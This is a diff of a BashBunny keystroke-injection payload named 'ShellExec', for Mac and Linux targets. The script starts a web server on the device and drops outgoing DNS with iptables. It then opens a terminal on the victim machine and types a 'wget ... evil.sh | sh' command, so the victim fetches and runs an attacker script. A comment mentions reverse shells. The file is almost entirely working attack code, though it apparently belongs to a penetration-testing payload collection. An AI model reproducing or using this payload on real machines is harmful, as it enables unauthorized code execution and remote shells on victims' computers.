@@ -3,7 +3,7 @@
 # Title:     ShellExec
 # Author:    audibleblink
 # Target:    Mac/Linux
-# Version:   1.1
+# Version:   1.2
 #
 # Create a web server on the BashBunny and force
 # the victim to download and execute a script.
@@ -21,16 +21,14 @@ GET SWITCH_POSITION
 GET HOST_IP
 
 payload_dir=/root/udisk/payloads/$SWITCH_POSITION
-log_file=$payload_dir/shellexec.log
-
 cd $payload_dir
 
 # starting server
-LED SPECIAL
+LED STAGE1
 
 # disallow outgoing dns requests so server starts immediately
 iptables -A OUTPUT -p udp --dport 53 -j DROP
-python -m SimpleHTTPServer 80
+python -m SimpleHTTPServer 80 &
 
 # wait until port is listening
 while ! nc -z localhost 80; do sleep 0.2; done
@@ -39,15 +37,23 @@ while ! nc -z localhost 80; do sleep 0.2; done
 LED ATTACK
 
 # macOS
-QUACK RUN OSX terminal
-QUACK DELAY 2000
-
-# ubunutu
-# QUACK RUN UNITY xterm
+# QUACK RUN OSX terminal
 # QUACK DELAY 2000
 
-QUACK STRING curl "http://$HOST_IP/evil.sh" \| sh
+# open a terminal on other Linux GUIs
+QUACK CTRL-ALT t
+QUACK DELAY 2000
+
+# QUACK STRING curl "http://$HOST_IP/evil.sh" \| sh
 # in case curl isn't installed
-# QUACK STRING wget -O - "http://$HOST_IP/evil.sh" \| sh 
+QUACK STRING wget -O - "http://$HOST_IP/evil.sh" \| sh
 QUACK ENTER
+
+# Note that reverse shells will normally block here.
+# The script won't exit until the remote user quits their shell.
+
+LED CLEANUP
+QUACK STRING exit
+QUACK ENTER
+
 LED SUCCESS
